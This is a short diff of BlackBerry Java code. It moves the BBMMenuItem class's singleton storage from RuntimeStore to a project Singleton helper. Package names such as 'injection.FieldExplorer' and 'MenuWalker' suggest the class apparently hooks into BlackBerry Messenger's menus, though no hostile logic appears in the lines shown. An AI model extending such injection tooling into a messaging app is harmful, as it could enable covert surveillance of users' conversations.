@@ -15,17 +15,18 @@ import java.util.Vector;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
 import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
 import net.rim.device.api.system.Backlight;
-import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Singleton;
 import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.FieldExplorer;
 import blackberry.injection.MenuWalker;
+import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
 
-public class BBMMenuItem extends ApplicationMenuItem {
+public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
     private static String BBM_MENU = "Yield Menu";
     //#ifdef DEBUG
     private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
@@ -48,11 +49,11 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
     public static synchronized BBMMenuItem getInstance() {
         if (instance == null) {
-            instance = (BBMMenuItem) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (BBMMenuItem) Singleton.self().get(GUID);
             if (instance == null) {
                 final BBMMenuItem singleton = new BBMMenuItem(20);
 
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
         }
